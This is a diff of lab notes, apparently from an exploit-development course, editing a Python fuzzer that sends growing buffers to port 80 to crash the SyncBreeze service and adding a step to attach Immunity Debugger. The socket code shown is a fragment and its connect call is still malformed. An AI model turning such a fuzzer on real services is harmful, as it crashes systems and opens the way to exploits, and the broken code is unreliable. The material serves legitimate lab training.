@@ -4,7 +4,7 @@
 _(To be performed on your own Kali and Windows lab client machines - Reporting is required for these exercises)_
 
 1.  Build the fuzzer and replicate the SyncBreeze crash.
-To start we must first build a fuzzer using python. We can use the following code to gather :
+To start we must first build a fuzzer using python. We can use the following code:
 ```python
 #!/usr/bin/python
 import socket
@@ -37,7 +37,7 @@ while(size < 2000):
 
     s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
     
-    s.connect((%s, 80) % (target))
+    s.connect(target, 80) 
     s.send(buffer)
     
     s.close()
@@ -49,6 +49,7 @@ while(size < 2000):
     print("\nCould not connect!")
     sys.exit()
 ```
+We must now start the syncbreeze service and attach Immunity Debugger to said service.
 
 
 2.  Inspect the content of other registers and stack memory. Does anything seem to be directly influenced by the fuzzing input?
